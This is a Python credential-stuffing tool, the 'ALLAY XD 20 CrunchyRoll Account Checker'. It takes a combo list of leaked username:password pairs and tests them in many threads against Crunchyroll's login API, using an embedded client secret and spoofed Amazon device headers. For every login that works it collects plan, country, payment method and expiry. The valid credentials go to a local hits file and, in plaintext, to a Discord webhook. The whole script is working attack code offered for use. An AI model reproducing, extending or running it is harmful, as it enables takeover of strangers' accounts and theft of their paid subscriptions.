import subprocess
import sys
import requests
import json
import time
import threading
from datetime import datetime, timedelta
import random
import string
import os
from colorama import Fore, Style, init

# Auto-install required packages
def install_requirements():
    required_packages = ['requests', 'colorama']
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"{Fore.YELLOW}Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install requirements before anything else
install_requirements()

init(autoreset=True)

# Custom ASCII Art for ALLAY XD 20
def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.MAGENTA}")
    print(f"   █████╗ ██╗     ██╗      █████╗ ██╗   ██╗    ██╗  ██╗██████╗ ")
    print(f"  ██╔══██╗██║     ██║     ██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝╚════██╗")
    print(f"  ███████║██║     ██║     ███████║ ╚████╔╝      ╚███╔╝  █████╔╝")
    print(f"  ██╔══██║██║     ██║     ██╔══██║  ╚██╔╝       ██╔██╗ ██╔═══╝ ")
    print(f"  ██║  ██║███████╗███████╗██║  ██║   ██║       ██╔╝ ██╗███████╗")
    print(f"  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚══════╝")
    print(f"{Fore.YELLOW}")
    print(f"  ╔══════════════════════════════════════════════════════════╗")
    print(f"  ║                    ALLAY XD 20                          ║")
    print(f"  ║           CrunchyRoll Account Checker v2.0              ║")
    print(f"  ║           Created by: https://t.me/hellocloudUHQ        ║")
    print(f"  ╚══════════════════════════════════════════════════════════╝")
    print(f"{Fore.CYAN}{'='*60}")
    print()

class DiscordWebhook:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.enabled = bool(webhook_url)
    
    def send_hit(self, account_data):
        """Send a green embed to Discord webhook when a hit is found"""
        if not self.enabled or not self.webhook_url:
            return False
        
        try:
            # Create green embed
            embed = {
                "title": "🎯 CrunchyRoll HIT FOUND!",
                "color": 65280,  # Green color
                "fields": [
                    {
                        "name": "Account Credentials",
                        "value": f"```{account_data['username']}:{account_data['password']}```",
                        "inline": False
                    },
                    {
                        "name": "Plan Details",
                        "value": f"**Plan:** {account_data['plan']}\n"
                                f"**Country:** {account_data['country']}\n"
                                f"**Auto Renew:** {account_data['auto_renew']}\n"
                                f"**Free Trial:** {account_data['free_trial']}",
                        "inline": True
                    },
                    {
                        "name": "Subscription Info",
                        "value": f"**Payment Method:** {account_data['payment_method']}\n"
                                f"**Expiry Date:** {account_data['expiry_date']}\n"
                                f"**Days Left:** {account_data['remaining_days']}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Checked by ALLAY XD 20 • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                },
                "thumbnail": {
                    "url": "https://upload.wikimedia.org/wikipedia/en/thumb/0/0d/Crunchyroll_Logo.svg/1200px-Crunchyroll_Logo.svg.png"
                }
            }
            
            # Prepare webhook data
            webhook_data = {
                "embeds": [embed],
                "username": "ALLAY XD 20 Checker",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
            }
            
            # Send to webhook
            response = requests.post(
                self.webhook_url,
                json=webhook_data,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code in [200, 204]:
                print(f"{Fore.GREEN}[WEBHOOK] Hit sent to Discord successfully!")
                return True
            else:
                print(f"{Fore.RED}[WEBHOOK] Failed to send: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[WEBHOOK] Error: {e}")
            return False

class CrunchyRollChecker:
    def __init__(self, debug_mode=False, webhook_url=None):
        self.debug_mode = debug_mode
        self.webhook = DiscordWebhook(webhook_url)
        self.session = requests.Session()
        
        self.stats = {
            'checked': 0,
            'hits': 0,
            'bad': 0,
            'retries': 0,
            'cpm': 0,
            'start_time': time.time(),
            'webhook_success': 0,
            'webhook_failed': 0
        }
        
        self.lock = threading.Lock()
        self.running = True
        
    def generate_random_string(self, pattern):
        result = []
        for char in pattern:
            if char == '?':
                result.append(random.choice(string.ascii_letters + string.digits))
            elif char == 'h':
                result.append(random.choice('0123456789abcdef'))
            else:
                result.append(char)
        return ''.join(result)
    
    def generate_guid(self):
        return ''.join(random.choice('0123456789ABCDEF') for _ in range(32))
    
    def get_remaining_days(self, expiry_date):
        try:
            expiry_dt = datetime.strptime(expiry_date, '%Y-%m-%d')
            now = datetime.now()
            delta = expiry_dt - now
            return str(delta.days) if delta.days > 0 else "0"
        except:
            return "?"
    
    def debug_print(self, message):
        if self.debug_mode:
            print(message)
    
    def check_account(self, username, password):
        try:
            device_id = self.generate_random_string("hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh")
            session_id = self.generate_random_string("hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh")
            
            self.debug_print(f"{Fore.YELLOW}[DEBUG] Checking: {username}")
            
            auth_data = {
                'grant_type': 'password',
                'username': username,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'ajcylfwdtjjtq7qpgks3',
                'client_secret': 'oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_',
                'device_type': 'DANTE',
                'device_id': device_id,
                'device_name': 'DANTE'
            }
            
            auth_headers = {
                'etp-anonymous-id': session_id,
                'User-Agent': 'Crunchyroll/deviceType: DANTE; appVersion: 4.10.0; osVersion: 12; model: DANTE; manufacturer: Amazon; brand: Amazo',
                'Accept': 'application/json',
                'Accept-Charset': 'UTF-8',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'beta-api.crunchyroll.com',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'x-DANTE': '@pyabrodie',
                'x-vip': '@pyabrodie'
            }
            
            self.debug_print(f"{Fore.CYAN}[DEBUG] Sending auth request...")
            
            auth_response = self.session.post(
                'https://beta-api.crunchyroll.com/auth/v1/token',
                data=auth_data,
                headers=auth_headers,
                timeout=20
            )
            
            self.debug_print(f"{Fore.CYAN}[DEBUG] Auth Status: {auth_response.status_code}")
            
            if auth_response.status_code != 200:
                self.debug_print(f"{Fore.RED}[DEBUG] Auth failed - Status: {auth_response.status_code}")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            if 'auth.obtain_access_token.invalid_credentials' in auth_response.text:
                self.debug_print(f"{Fore.RED}[DEBUG] Invalid credentials")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            if '"account_id"' not in auth_response.text:
                self.debug_print(f"{Fore.RED}[DEBUG] No account_id in response")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            try:
                response_text = auth_response.text
                access_token_start = response_text.find('"access_token":"') + 16
                access_token_end = response_text.find('"', access_token_start)
                access_token = response_text[access_token_start:access_token_end]
                
                account_id_start = response_text.find('"account_id":"') + 14
                account_id_end = response_text.find('"', account_id_start)
                account_id = response_text[account_id_start:account_id_end]
                
                self.debug_print(f"{Fore.GREEN}[DEBUG] Got access token: {access_token[:20]}...")
                self.debug_print(f"{Fore.GREEN}[DEBUG] Got account_id: {account_id}")
                
                if not access_token:
                    self.debug_print(f"{Fore.RED}[DEBUG] Empty access token")
                    with self.lock:
                        self.stats['bad'] += 1
                        self.stats['checked'] += 1
                    return None
                    
            except Exception as e:
                self.debug_print(f"{Fore.RED}[DEBUG] Parse error: {e}")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            profile_headers = {
                'Host': 'beta-api.crunchyroll.com',
                'authorization': f'Bearer {access_token}',
                'etp-anonymous-id': session_id,
                'accept-encoding': 'gzip',
                'if-modified-since': 'Sun, 14 Apr 2024 17:28:31 GMT',
                'User-Agent': 'Crunchyroll/deviceType: DANTE; appVersion: 4.10.0; osVersion: 12; model: DANTE; manufacturer: Amazon; brand: Amazo'
            }
            
            profile_response = self.session.get(
                'https://beta-api.crunchyroll.com/accounts/v1/me',
                headers=profile_headers,
                timeout=20
            )
            
            self.debug_print(f"{Fore.CYAN}[DEBUG] Profile Status: {profile_response.status_code}")
            
            if profile_response.status_code != 200:
                self.debug_print(f"{Fore.RED}[DEBUG] Profile failed")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            try:
                profile_text = profile_response.text
                external_id_start = profile_text.find('"external_id":"') + 15
                external_id_end = profile_text.find('"', external_id_start)
                external_id = profile_text[external_id_start:external_id_end]
                
                self.debug_print(f"{Fore.GREEN}[DEBUG] Got external_id: {external_id}")
            except Exception as e:
                self.debug_print(f"{Fore.RED}[DEBUG] Profile parse error: {e}")
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return None
            
            benefits_response = self.session.get(
                f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
                headers=profile_headers,
                timeout=20
            )
            
            country = 'Unknown'
            if benefits_response.status_code == 200:
                try:
                    benefits_text = benefits_response.text
                    country_start = benefits_text.find('"subscription_country":"') + 24
                    country_end = benefits_text.find('"', country_start)
                    country = benefits_text[country_start:country_end]
                    self.debug_print(f"{Fore.GREEN}[DEBUG] Country: {country}")
                except Exception as e:
                    self.debug_print(f"{Fore.RED}[DEBUG] Benefits parse error: {e}")
                    country = 'Unknown'
            else:
                self.debug_print(f"{Fore.RED}[DEBUG] Benefits failed: {benefits_response.status_code}")
            
            subscription_response = self.session.get(
                f'https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}',
                headers=profile_headers,
                timeout=20
            )
            
            self.debug_print(f"{Fore.CYAN}[DEBUG] Subscription Status: {subscription_response.status_code}")
            
            plan = 'No Subscription'
            auto_renew = 'false'
            free_trial = 'false'
            payment_method = 'none'
            expiry_date = 'Unknown'
            remaining_days = '?'
            
            subscription_text = subscription_response.text
            
            if (subscription_response.status_code != 200 or 
                'subscription.not_found' in subscription_text or 
                'Subscription Not Found' in subscription_text):
                
                plan = 'No Subscription'
                self.debug_print(f"{Fore.YELLOW}[DEBUG] Free account detected")
            else:
                try:
                    plan_start = subscription_text.find('"tier":"') + 8
                    plan_end = subscription_text.find('"', plan_start)
                    plan_raw = subscription_text[plan_start:plan_end]
                    
                    if plan_raw == 'fan_pack':
                        plan = 'Mega Fan Plan'
                    elif plan_raw == 'super_fan_pack':
                        plan = 'Ultimate Fan Plan'
                    elif plan_raw == 'premium':
                        plan = 'Fan Plan'
                    else:
                        plan = plan_raw
                    
                    auto_renew_start = subscription_text.find('"auto_renew":') + 13
                    auto_renew_end = subscription_text.find(',', auto_renew_start)
                    auto_renew_raw = subscription_text[auto_renew_start:auto_renew_end].strip()
                    auto_renew = 'true' if auto_renew_raw == 'true' else 'false'
                    
                    free_trial_start = subscription_text.find('"active_free_trial":') + 20
                    free_trial_end = subscription_text.find(',', free_trial_start)
                    free_trial_raw = subscription_text[free_trial_start:free_trial_end].strip()
                    free_trial = 'true' if free_trial_raw == 'true' else 'false'
                    
                    payment_start = subscription_text.find('"source":"') + 10
                    payment_end = subscription_text.find('"', payment_start)
                    payment_method = subscription_text[payment_start:payment_end] if payment_start > 10 else 'none'
                    
                    expiry_start = subscription_text.find('"expiration_date":"') + 19
                    expiry_end = subscription_text.find('T', expiry_start)
                    if expiry_start > 19:
                        expiry_date = subscription_text[expiry_start:expiry_end]
                        remaining_days = self.get_remaining_days(expiry_date)
                    
                    self.debug_print(f"{Fore.GREEN}[DEBUG] Plan: {plan}, Auto Renew: {auto_renew}, Free Trial: {free_trial}")
                    self.debug_print(f"{Fore.GREEN}[DEBUG] Payment: {payment_method}, Expiry: {expiry_date}, Days: {remaining_days}")
                    
                except Exception as e:
                    self.debug_print(f"{Fore.RED}[DEBUG] Subscription parse error: {e}")
            
            result = {
                'username': username,
                'password': password,
                'country': country,
                'plan': plan,
                'auto_renew': auto_renew,
                'free_trial': free_trial,
                'payment_method': payment_method,
                'expiry_date': expiry_date,
                'remaining_days': remaining_days
            }
            
            self.debug_print(f"{Fore.GREEN}[DEBUG] Final result: {result}")
            
            with self.lock:
                self.stats['checked'] += 1
                if plan != 'No Subscription':
                    self.stats['hits'] += 1
                    # Send to Discord webhook
                    if self.webhook.enabled:
                        if self.webhook.send_hit(result):
                            self.stats['webhook_success'] += 1
                        else:
                            self.stats['webhook_failed'] += 1
                else:
                    self.stats['bad'] += 1
            
            return result
            
        except Exception as e:
            self.debug_print(f"{Fore.RED}[DEBUG] General error: {e}")
            with self.lock:
                self.stats['retries'] += 1
            return None
    
    def save_hit(self, account_data):
        filename = 'crunchyroll_Hits.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{account_data['username']}:{account_data['password']} | "
            line += f"Country = {account_data['country']} | "
            line += f"Plan = {account_data['plan']} | "
            line += f"Auto-Renew = {account_data['auto_renew']} | "
            line += f"Free-Trial = {account_data['free_trial']} | "
            line += f"Payment-Method = {account_data['payment_method']} | "
            line += f"Expiry-Date = {account_data['expiry_date']} | "
            line += f"Remaining-Days = {account_data['remaining_days']} | "
            line += f"BY = ALLAY XD 20\n"
            
            f.write(line)
    
    def update_stats(self):
        while self.running:
            time.sleep(2)
            with self.lock:
                elapsed = time.time() - self.stats['start_time']
                if elapsed > 0:
                    self.stats['cpm'] = int((self.stats['checked'] / elapsed) * 60)
    
    def display_stats(self):
        while self.running:
            time.sleep(0.5)
            os.system('cls' if os.name == 'nt' else 'clear')
            
            # Display mini banner
            print(f"{Fore.MAGENTA}")
            print(f"╔══════════════════════════════════════════════════════╗")
            print(f"║                 {Fore.YELLOW}ALLAY XD 20{Fore.MAGENTA}                       ║")
            print(f"║           {Fore.CYAN}CrunchyRoll Account Checker{Fore.MAGENTA}            ║")
            print(f"╚══════════════════════════════════════════════════════╝")
            print()
            
            print(f"{Fore.CYAN}╔══════════════════════════════════════╗")
            print(f"║        {Fore.YELLOW}STATISTICS{Fore.CYAN}                   ║")
            print(f"╠══════════════════════════════════════╣")
            print(f"║ {Fore.WHITE}Checked: {Fore.GREEN}{self.stats['checked']:<8} {Fore.WHITE}CPM: {Fore.CYAN}{self.stats['cpm']:<6}{Fore.CYAN} ║")
            print(f"║ {Fore.WHITE}Hits: {Fore.GREEN}{self.stats['hits']:<10} {Fore.WHITE}Bad: {Fore.RED}{self.stats['bad']:<7}{Fore.CYAN} ║")
            print(f"║ {Fore.WHITE}Retries: {Fore.YELLOW}{self.stats['retries']:<7} {Fore.WHITE}Threads: {Fore.MAGENTA}Active{Fore.CYAN}   ║")
            if self.webhook.enabled:
                print(f"║ {Fore.WHITE}Webhook: {Fore.GREEN}✓{self.stats['webhook_success']:<4}{Fore.RED}✗{self.stats['webhook_failed']:<3}{Fore.CYAN}            ║")
            print(f"╚══════════════════════════════════════╝")
            print()
            
            if self.stats['checked'] > 0:
                print(f"{Fore.WHITE}Latest results will appear here...")
    
    def worker(self, accounts):
        for account in accounts:
            if not self.running:
                break
                
            if ':' not in account:
                continue
                
            username, password = account.strip().split(':', 1)
            result = self.check_account(username, password)
            
            if result:
                if result['plan'] != 'No Subscription':
                    print(f"{Fore.GREEN}[HIT] {result['username']} | {result['plan']} | {result['country']} | {result['remaining_days']} days")
                    self.save_hit(result)
                else:
                    print(f"{Fore.RED}[FREE] {result['username']} | No Subscription")
            else:
                print(f"{Fore.RED}[BAD] {username} | Invalid credentials")
    
    def start_checking(self, account_file, threads=10):
        try:
            with open(account_file, 'r', encoding='utf-8') as f:
                accounts = [line.strip() for line in f if ':' in line]
        except:
            print(f"{Fore.RED}Error: Could not read account file!")
            return
        
        if not accounts:
            print(f"{Fore.RED}No valid accounts found in file!")
            return
        
        print(f"{Fore.GREEN}Loaded {len(accounts)} accounts")
        print(f"{Fore.YELLOW}Starting check with {threads} threads...")
        time.sleep(2)
        
        stats_thread = threading.Thread(target=self.update_stats)
        display_thread = threading.Thread(target=self.display_stats)
        stats_thread.daemon = True
        display_thread.daemon = True
        stats_thread.start()
        display_thread.start()
        
        accounts_per_thread = len(accounts) // threads
        thread_list = []
        
        for i in range(threads):
            start = i * accounts_per_thread
            end = None if i == threads - 1 else (i + 1) * accounts_per_thread
            thread_accounts = accounts[start:end]
            
            if thread_accounts:
                thread = threading.Thread(target=self.worker, args=(thread_accounts,))
                thread_list.append(thread)
                thread.start()
        
        for thread in thread_list:
            thread.join()
        
        self.running = False
        time.sleep(1)
        
        # Final summary
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════╗")
        print(f"║                  {Fore.YELLOW}CHECKING COMPLETED!{Fore.CYAN}                ║")
        print(f"╠══════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}✓ Hits: {self.stats['hits']:<30}{Fore.CYAN} ║")
        print(f"║ {Fore.RED}✗ Bad: {self.stats['bad']:<31}{Fore.CYAN} ║")
        print(f"║ {Fore.YELLOW}↺ Retries: {self.stats['retries']:<26}{Fore.CYAN} ║")
        print(f"║ {Fore.WHITE}Total checked: {self.stats['checked']:<23}{Fore.CYAN} ║")
        if self.webhook.enabled:
            print(f"║ {Fore.WHITE}Webhook sent: {Fore.GREEN}{self.stats['webhook_success']:<4}{Fore.RED}Failed: {self.stats['webhook_failed']:<15}{Fore.CYAN} ║")
        print(f"╚══════════════════════════════════════════════════════╝")
        print(f"\n{Fore.WHITE}Results saved to: {Fore.CYAN}crunchyroll_Hits.txt")

def main():
    # Display banner
    display_banner()
    
    account_file = input(f"{Fore.WHITE}Enter combo file path: ").strip()
    
    if not os.path.exists(account_file):
        print(f"{Fore.RED}File not found!")
        return
    
    # Ask for Discord webhook
    webhook_input = input(f"{Fore.WHITE}Enter Discord Webhook URL (press Enter to skip): ").strip()
    
    debug_input = input(f"{Fore.WHITE}Enable DEBUG MODE? (y/n, default n): ").strip().lower()
    debug_mode = debug_input == 'y'
    
    try:
        threads = int(input(f"{Fore.WHITE}Enter number of threads (default 10): ") or "10")
    except:
        threads = 10
    
    checker = CrunchyRollChecker(debug_mode=debug_mode, webhook_url=webhook_input)
    
    if webhook_input:
        print(f"{Fore.GREEN}✓ Discord webhook enabled!")
        # Test webhook
        print(f"{Fore.YELLOW}Testing webhook connection...")
        test_data = {
            'username': 'test@example.com',
            'password': 'testpassword',
            'country': 'Test Country',
            'plan': 'Test Plan',
            'auto_renew': 'true',
            'free_trial': 'false',
            'payment_method': 'test',
            'expiry_date': '2024-12-31',
            'remaining_days': '100'
        }
        if checker.webhook.send_hit(test_data):
            print(f"{Fore.GREEN}✓ Webhook test successful!")
        else:
            print(f"{Fore.YELLOW}⚠ Webhook test failed, but checking will continue...")
        time.sleep(2)
    
    checker.start_checking(account_file, threads)

if __name__ == "__main__":
    main()
